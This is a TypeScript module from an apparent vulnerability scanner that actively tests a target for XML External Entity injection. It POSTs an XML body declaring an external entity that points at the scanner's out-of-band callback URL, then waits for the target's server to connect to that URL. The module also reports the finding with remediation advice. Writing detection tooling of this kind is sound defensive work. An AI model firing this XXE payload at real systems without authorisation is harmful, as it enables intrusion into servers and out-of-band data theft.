// XML External Entity (XXE) active probe (AGGRESSIVE tier). POSTs an XML document
// declaring an external entity pointing at our out-of-band collaborator; if the
// target's XML parser resolves it, the server itself calls our unique URL and the
// recorded callback is the proof. Runs only when an OOB collaborator is
// configured. Non-destructive: the entity points at OUR listener, nothing else.
import { aggFetch, buildPostOobEvidence } from "./aggHttp.js";
import type { ProbeContext, RedTeamFinding } from "../redTeam/types.js";

// Endpoints most likely to accept an XML body on a black-box target.
const XML_PATHS = ["/", "/xml", "/api", "/api/xml", "/import", "/upload", "/soap"];

export async function probeXxe(ctx: ProbeContext): Promise<RedTeamFinding | null> {
  if (!ctx.oob) return null;

  const probe = await ctx.oob.issue(ctx.scanId);
  const xml =
    `<?xml version="1.0" encoding="UTF-8"?>` +
    `<!DOCTYPE root [<!ENTITY xxe SYSTEM "${probe.url}">]>` +
    `<root>&xxe;</root>`;
  const headers = { ...ctx.fuzzHeaders, "Content-Type": "application/xml" };

  let firstPath = XML_PATHS[0];
  for (const path of XML_PATHS) {
    const target = `${ctx.url.replace(/\/+$/, "")}${path}`;
    firstPath = target;
    try {
      // The target may not respond usefully — the callback, not this response,
      // is the proof — so a failure here is expected and ignored.
      await aggFetch(target, { method: "POST", headers, body: xml });
    } catch {
      /* keep trying the other candidate endpoints */
    }
  }

  // Wait a bounded window for the target's parser to reach our collaborator.
  const event = await ctx.oob.poll(probe.token, 8000);
  if (!event) return null;

  return {
    testName: "Active XML External Entity (XXE) — out-of-band",
    payload: `<!ENTITY xxe SYSTEM "${probe.url}">`,
    severity: "critical",
    description:
      "The target's XML parser resolved an external entity we declared, causing the server to fetch a unique Seclayer collaborator URL from its own infrastructure. This confirms XXE: an attacker can force the server to read local files, reach internal services, and exfiltrate data out-of-band.",
    fix: "Disable external entity and DTD processing in every XML parser (e.g. set FEATURE_SECURE_PROCESSING, disallow-doctype-decl, and disable external-general/parameter-entities). Prefer a hardened parser configuration or a non-XML format where possible.",
    evidence: buildPostOobEvidence({
      reqMethod: "POST",
      attackUrl: firstPath,
      requestHeaders: headers,
      requestBody: xml,
      callbackUrl: probe.url,
      token: probe.token,
      event,
      why: "This is our collaborator's record of the target fetching the unique, unguessable URL we embedded as an external XML entity. Only a server that parsed our DTD and resolved the entity could produce this callback.",
      demonstration: `We POSTed an XML document whose external entity pointed at a one-time Seclayer URL, and moments later the target itself connected to that URL from ${event.sourceIp}. That callback proves the server's XML parser resolves attacker-controlled external entities — the core of XXE.`,
    }),
  };
}
